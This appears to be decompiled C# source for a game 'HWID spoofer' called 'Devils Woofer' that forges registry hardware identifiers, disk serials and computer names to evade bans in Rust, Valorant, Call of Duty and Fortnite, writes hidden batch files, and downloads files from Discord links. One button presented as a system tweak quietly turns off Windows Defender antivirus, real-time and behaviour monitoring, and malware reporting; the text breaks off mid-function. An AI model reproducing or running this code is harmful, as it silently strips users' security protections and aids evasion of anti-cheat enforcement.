							});
							RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
							registryKey.SetValue("ProductID", value);
							registryKey.Close();
							Main.InstallDate();
							Main.Disk();
							Main.HWIDclick();
							Main.XBOXclick();
							Main.PCclick();
							Main.Diskclick();
							Main.New();
							Main.SpoofPCName();
							string path4 = "C:\\Program Files\\Win64";
							bool flag20 = !Directory.Exists(path4);
							if (flag20)
							{
								Directory.CreateDirectory(path4);
							}
							bool flag21 = File.Exists("C:\\Program Files\\Win64\\net.bat");
							if (flag21)
							{
								Process.Start("C:\\Program Files\\Win64\\net.bat");
							}
							else
							{
								string text5 = "C:\\Program Files\\Win64\\net.bat";
								using (StreamWriter streamWriter5 = File.CreateText(text5))
								{
									streamWriter5.WriteLine("netsh int ip reset");
								}
								Process process6 = new Process();
								process6.StartInfo.FileName = text5;
								this.processlist.Add(process6);
								File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
								process6.Start();
							}
							bool flag22 = File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe");
							if (flag22)
							{
								File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
							}
							bool flag23 = File.Exists("C:\\Program Files\\Unlisted\\change.bat");
							if (flag23)
							{
								File.Delete("C:\\Program Files\\Unlisted\\change.bat");
							}
							string text6 = this.diskname.Text;
							string path5 = "C:\\Program Files\\Unlisted";
							bool flag24 = !Directory.Exists(path5);
							if (flag24)
							{
								Directory.CreateDirectory(path5);
							}
							bool flag25 = File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe");
							if (flag25)
							{
								string text7 = "C:\\Program Files\\Unlisted\\change.bat";
								using (StreamWriter streamWriter6 = File.CreateText(text7))
								{
									streamWriter6.WriteLine(string.Concat(new string[]
									{
										"volumeid.exe ",
										text6,
										": ",
										Main.DiskGen(4),
										"-",
										Main.DiskGen(4),
										" -nobanner"
									}));
								}
								Process process7 = new Process();
								process7.StartInfo.FileName = text7;
								this.processlist.Add(process7);
								File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
								process7.Start();
								File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
								File.Delete("C:\\Program Files\\Unlisted\\change.bat");
								Directory.Delete(path5);
							}
							else
							{
								string text8 = "C:\\Program Files\\Unlisted\\change.bat";
								using (StreamWriter streamWriter7 = File.CreateText(text8))
								{
									streamWriter7.WriteLine(string.Concat(new string[]
									{
										"volumeid.exe ",
										text6,
										": ",
										Main.DiskGen(4),
										"-",
										Main.DiskGen(4),
										" -nobanner"
									}));
								}
								Process process8 = new Process();
								process8.StartInfo.FileName = text8;
								this.processlist.Add(process8);
								File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
								process8.Start();
								File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
								File.Delete("C:\\Program Files\\Unlisted\\change.bat");
								Directory.Delete(path5);
							}
							MessageBox.Show("Spoofed Rust!", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
						}
						else
						{
							bool flag26 = this.MethodCB.Text == "Valorant";
							if (flag26)
							{
								foreach (string text9 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
								{
									foreach (string text10 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + text9).GetSubKeyNames())
									{
										RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(string.Concat(new string[]
										{
											"HARDWARE\\DEVICEMAP\\Scsi\\",
											text9,
											"\\",
											text10,
											"\\Target Id 0\\Logical Unit Id 0"
										}), true);
										bool flag27 = registryKey2 != null && registryKey2.GetValue("DeviceType").ToString() == "DiskPeripheral";
										if (flag27)
										{
											string text11 = Main.RandomId(14);
											string text12 = Main.RandomId(14);
											registryKey2.SetValue("DeviceIdentifierPage", Encoding.UTF8.GetBytes(text12));
											registryKey2.SetValue("Identifier", text11);
											registryKey2.SetValue("InquiryData", Encoding.UTF8.GetBytes(text11));
											registryKey2.SetValue("SerialNumber", text12);
										}
									}
									RegistryKey registryKey3 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", true);
									registryKey3.SetValue("ComputerName", "DESKTOP-" + Main.GenerateString(6));
									registryKey3.Close();
									string text13 = string.Concat(new string[]
									{
										Main.GenerateString(5),
										"-",
										Main.GenerateString(5),
										"-",
										Main.GenerateString(5),
										"-",
										Main.GenerateString(5)
									});
									string path6 = "C:\\Program Files\\Sounds";
									bool flag28 = !Directory.Exists(path6);
									if (flag28)
									{
										Directory.CreateDirectory(path6);
									}
									Main.HWIDclick();
									string path7 = "C:\\Program Files\\Sounds";
									bool flag29 = !Directory.Exists(path7);
									if (flag29)
									{
										Directory.CreateDirectory(path7);
									}
									bool flag30 = File.Exists("C:\\Program Files\\Sounds\\valospoofed.wav");
									if (flag30)
									{
										new SoundPlayer("C:\\Program Files\\Sounds\\valospoofed.wav").Play();
									}
									else
									{
										string address2 = "https://cdn.discordapp.com/attachments/953684464104513571/960200320993095731/valospoofed.wav";
										string fileName2 = "C:\\Program Files\\Sounds\\valospoofed.wav";
										WebClient webClient2 = new WebClient();
										webClient2.DownloadFile(address2, fileName2);
										File.SetAttributes("C:\\Program Files\\Sounds\\valospoofed.wav", FileAttributes.Hidden);
										new SoundPlayer("C:\\Program Files\\Sounds\\valospoofed.wav").Play();
									}
									MessageBox.Show("Valorant Spoofed, New ID: " + Main.CurrentProductID(), "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
								}
							}
							else
							{
								bool flag31 = this.MethodCB.Text == "COD";
								if (flag31)
								{
									string tempPath2 = Path.GetTempPath();
									Class1 class3 = new Class1();
									class3.spoofUserMode();
									Main.HWIDclick();
									string value2 = string.Concat(new string[]
									{
										Main.GenerateString(5),
										"-",
										Main.GenerateString(5),
										"-",
										Main.GenerateString(5),
										"-",
										Main.GenerateString(5)
									});
									RegistryKey registryKey4 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
									registryKey4.SetValue("ProductID", value2);
									registryKey4.Close();
									Main.InstallDate();
									Main.Disk();
									Main.HWIDclick();
									Main.XBOXclick();
									Main.PCclick();
									Main.Diskclick();
									Main.New();
									Main.SpoofPCName();
									string path8 = "C:\\Program Files\\Win64";
									bool flag32 = !Directory.Exists(path8);
									if (flag32)
									{
										Directory.CreateDirectory(path8);
									}
									bool flag33 = File.Exists("C:\\Program Files\\Win64\\net.bat");
									if (flag33)
									{
										Process.Start("C:\\Program Files\\Win64\\net.bat");
									}
									else
									{
										string text14 = "C:\\Program Files\\Win64\\net.bat";
										using (StreamWriter streamWriter8 = File.CreateText(text14))
										{
											streamWriter8.WriteLine("netsh int ip reset");
										}
										Process process9 = new Process();
										process9.StartInfo.FileName = text14;
										this.processlist.Add(process9);
										File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
										process9.Start();
									}
									bool flag34 = File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe");
									if (flag34)
									{
										File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
									}
									bool flag35 = File.Exists("C:\\Program Files\\Unlisted\\change.bat");
									if (flag35)
									{
										File.Delete("C:\\Program Files\\Unlisted\\change.bat");
									}
									string text15 = this.diskname.Text;
									string path9 = "C:\\Program Files\\Unlisted";
									bool flag36 = !Directory.Exists(path9);
									if (flag36)
									{
										Directory.CreateDirectory(path9);
									}
									bool flag37 = File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe");
									if (flag37)
									{
										string text16 = "C:\\Program Files\\Unlisted\\change.bat";
										using (StreamWriter streamWriter9 = File.CreateText(text16))
										{
											streamWriter9.WriteLine(string.Concat(new string[]
											{
												"volumeid.exe ",
												text15,
												": ",
												Main.DiskGen(4),
												"-",
												Main.DiskGen(4),
												" -nobanner"
											}));
										}
										Process process10 = new Process();
										process10.StartInfo.FileName = text16;
										this.processlist.Add(process10);
										File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
										process10.Start();
										File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
										File.Delete("C:\\Program Files\\Unlisted\\change.bat");
										Directory.Delete(path9);
									}
									else
									{
										string text17 = "C:\\Program Files\\Unlisted\\change.bat";
										using (StreamWriter streamWriter10 = File.CreateText(text17))
										{
											streamWriter10.WriteLine(string.Concat(new string[]
											{
												"volumeid.exe ",
												text15,
												": ",
												Main.DiskGen(4),
												"-",
												Main.DiskGen(4),
												" -nobanner"
											}));
										}
										Process process11 = new Process();
										process11.StartInfo.FileName = text17;
										this.processlist.Add(process11);
										File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
										process11.Start();
										File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
										File.Delete("C:\\Program Files\\Unlisted\\change.bat");
										Directory.Delete(path9);
									}
									MessageBox.Show("Spoofed Call Of Duty!", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
								}
								else
								{
									bool flag38 = this.MethodCB.Text == "Fortnite";
									if (flag38)
									{
										string path10 = "C:\\Program Files\\Sounds";
										bool flag39 = !Directory.Exists(path10);
										if (flag39)
										{
											Directory.CreateDirectory(path10);
										}
										bool flag40 = File.Exists("C:\\Program Files\\Sounds\\fortinaity.wav");
										if (flag40)
										{
											new SoundPlayer("C:\\Program Files\\Sounds\\fortinaity.wav").Play();
											MessageBox.Show("Fortnite Spoofed!", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
										}
										else
										{
											string address3 = "https://cdn.discordapp.com/attachments/953684464104513571/959438041670381628/fortinaity.wav";
											string fileName3 = "C:\\Program Files\\Sounds\\fortinaity.wav";
											WebClient webClient3 = new WebClient();
											webClient3.DownloadFile(address3, fileName3);
											File.SetAttributes("C:\\Program Files\\Sounds\\fortinaity.wav", FileAttributes.Hidden);
											new SoundPlayer("C:\\Program Files\\Sounds\\fortinaity.wav").Play();
											MessageBox.Show("Fortnite Spoofed!", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
										}
									}
									else
									{
										MessageBox.Show("Please Select A Game!", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
									}
								}
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600005B RID: 91 RVA: 0x00005D00 File Offset: 0x00003F00
		private void siticoneGradientButton3_Click_1(object sender, EventArgs e)
		{
			this.gamepanel.BringToFront();
		}

		// Token: 0x0600005C RID: 92 RVA: 0x00005D0F File Offset: 0x00003F0F
		private void siticoneGradientButton4_Click_1(object sender, EventArgs e)
		{
			this.settingspanel.BringToFront();
		}

		// Token: 0x0600005D RID: 93 RVA: 0x000030F6 File Offset: 0x000012F6
		private void gamepanel_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0600005E RID: 94 RVA: 0x000030F6 File Offset: 0x000012F6
		private void MethodCB_SelectedIndexChanged_1(object sender, EventArgs e)
		{
		}

		// Token: 0x0600005F RID: 95 RVA: 0x00005D1E File Offset: 0x00003F1E
		private void siticoneRoundedButton1_Click(object sender, EventArgs e)
		{
			Main.HWIDclick();
			MessageBox.Show("Spoofed HWID!", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000060 RID: 96 RVA: 0x00005D3C File Offset: 0x00003F3C
		public void xynwbyzia()
		{
			string tempPath = Path.GetTempPath();
			bool flag = Process.GetProcessesByName(this.xynw + ".bat").Length == 0;
			if (flag)
			{
				File.Delete(tempPath + this.xynw + ".bat");
			}
			else
			{
				Thread.Sleep(5000);
				this.xynwbyzia();
			}
		}

		// Token: 0x06000061 RID: 97 RVA: 0x00005D9C File Offset: 0x00003F9C
		public static string GenerateDate(int size)
		{
			char[] array = new char[size];
			for (int i = 0; i < size; i++)
			{
				array[i] = "abcdef0123456789"[Main.random.Next("abcdef0123456789".Length)];
			}
			return new string(array);
		}

		// Token: 0x06000062 RID: 98 RVA: 0x00005DF0 File Offset: 0x00003FF0
		private void siticoneRoundedButton7_Click(object sender, EventArgs e)
		{
			string value = Main.GenerateDate(8);
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
			registryKey.SetValue("InstallDate", value);
			registryKey.Close();
			MessageBox.Show("Logs Spoofed!", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x06000063 RID: 99 RVA: 0x00005E47 File Offset: 0x00004047
		private void siticoneRoundedButton4_Click(object sender, EventArgs e)
		{
			Thread.Sleep(2500);
			MessageBox.Show("Mac Spoofed!", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x06000064 RID: 100 RVA: 0x00005E68 File Offset: 0x00004068
		private void siticoneRoundedButton2_Click(object sender, EventArgs e)
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "Append Completion", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "AutoSuggest", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", "EnableAutoTray", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Copy To", "", "{C2FBB630-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Move To", "", "{C2FBB631-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "AutoEndTasks", "1");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "HungAppTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WaitToKillAppTimeout", "2000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "LowLevelHooksTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLowDiskSpaceChecks", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "LinkResolveIgnoreLinkInfo", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveSearch", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveTrack", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoInternetOpenWith", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "2000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagsvc", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 1, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "GPU Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Priority", 6, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Scheduling Category", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "GPU Priority", 0, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Scheduling Category", "Medium", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("Append Completion", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("AutoSuggest", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", true).DeleteValue("EnableAutoTray", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "0", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Copy To", false);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Move To", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("AutoEndTasks", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("HungAppTimeout", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("WaitToKillAppTimeout", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("LowLevelHooksTimeout", false);
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "400");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "400");
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoLowDiskSpaceChecks", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("LinkResolveIgnoreLinkInfo", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveSearch", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveTrack", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoInternetOpenWith", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "5000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 14, RegistryValueKind.DWord);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("GPU Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Scheduling Category", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("SFIO Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("GPU Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Scheduling Category", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("SFIO Priority", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System", "PublishUserActivities", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\SQMClient\\Windows", "CEIPEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "AITEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableInventory", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisablePCA", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableUAR", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Device Metadata", "PreventDeviceMetadataFromNetwork", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\AutoLogger\\SQMLogger", "Start", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\System", "AllowExperimentation", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiVirus", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableSpecialRunningModes", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", "DisableBlockAtFirstSeen", 1);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\MpEngine", "MpEnablePus", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "PUAProtection", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "DisableScanningNetworkFiles", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SpyNetReporting", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SubmitSamplesConsent", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontReportInfectionInformation", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("\\CLSID\\{09A47860-11B0-4DA5-AFA5-26D86198A780}", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1", RegistryValueKind.DWord);
			Main.HWIDclick();
			string text = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine("echo off");
				streamWriter.WriteLine("cls");
